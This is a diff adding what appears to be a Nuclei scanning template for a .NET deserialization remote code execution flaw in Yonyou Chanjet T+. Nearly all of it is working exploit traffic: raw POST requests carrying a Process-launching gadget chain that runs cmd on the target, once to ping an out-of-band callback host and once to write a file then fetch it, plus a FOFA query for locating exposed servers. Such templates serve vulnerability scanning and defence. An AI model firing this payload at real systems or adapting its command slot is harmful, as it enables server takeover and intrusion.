@@ -1,0 +1,80 @@
+http:
+    - matchers:
+        - name: dnslog
+          part: interactsh_protocol
+          type: word
+          words:
+            - dns
+      raw:
+        - |
+          POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F
+
+          {
+            "storeID":{
+              "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+              "MethodName":"Start",
+              "ObjectInstance":{
+                "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                "StartInfo":{
+                  "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                  "FileName":"cmd",
+                  "Arguments":"/c ping {{interactsh-url}}"
+                }
+              }
+            }
+          }
+    - matchers:
+        - name: writefile
+          part: body
+          type: word
+          words:
+            - '{{randstr}}'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F
+
+          {
+            "storeID":{
+              "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+              "MethodName":"Start",
+              "ObjectInstance":{
+                "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                "StartInfo":{
+                  "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                  "FileName":"cmd",
+                  "Arguments":"/c echo {{randstr}} > .{{randstr}}.txt"
+                }
+              }
+            }
+          }
+        - |
+          GET /tplus/.{{randstr}}.txt HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0
+          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+id: yonyou-chanjet-tplus-getstorewarehousebystore-rce
+info:
+    author: hufei
+    description: 用友 畅捷通T+ GetStoreWarehouseByStore 存在 .net反序列化漏洞，导致远程命令执行，控制服务器。
+    metadata:
+        fofa-query: app="畅捷通-TPlus"
+        veified: true
+    name: 畅捷通T+系统 远程代码执行漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/11MbxNEWqlhU5aZka1GmvA
+    severity: critical
+    tags:
+        - chanjet
+        - yonyou
+        - Oce
+        - NOS
+        - 畅捷通-TPlus
+        - ajaxpro
